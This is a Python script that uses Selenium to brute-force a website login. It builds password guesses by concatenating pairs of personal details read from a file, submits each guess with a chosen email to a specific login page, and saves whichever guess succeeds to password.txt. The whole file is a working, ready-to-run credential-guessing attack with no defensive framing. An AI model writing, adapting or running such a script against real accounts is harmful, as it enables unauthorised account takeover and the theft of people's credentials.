import time
import os
from random import randint
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import *

def combiner (informations):
        liste_Pswds = []
        for info in informations :
                for info2 in informations[1:] :
                        liste_Pswds.append (info+info2)
        return liste_Pswds

chromedriver = "chromedriver.exe"
chrome_options = webdriver.ChromeOptions()
os.environ["webdriver.chrome.driver"] = chromedriver
file = open("informations.txt", "r")
informations =file.read()
informations =informations.split("\n")
combinaisons = combiner (informations)
username = input("Entrez l'email d'utilisateur :")

for password in combinaisons:
	browser = webdriver.Chrome(executable_path=chromedriver , chrome_options=chrome_options)
	browser.get("http://achraf-ben-hamou.fr/Login_v1/")
	time.sleep(2)
	inputElement = browser.find_element_by_xpath("//*[@id='email']")
	inputElement.send_keys(username)
	inputElement = browser.find_element_by_xpath("//*[@id='pass']")
	inputElement.send_keys(password)
	inputElement = browser.find_element_by_xpath("//*[@id='myButton']")
	inputElement.click()
	print("\nje test :",password)
	time.sleep(5)
	try:
		tt = browser.find_element_by_xpath("//*[@id='myButton']")
		print("non valide",password)
		browser.close()
	except:
		print("votre mot de pass est :",password)
		file ="password.txt"
		rrr = open(file, "w")
		rrr.write(password)
		mmm=input("Tapez pour quiter")
		break

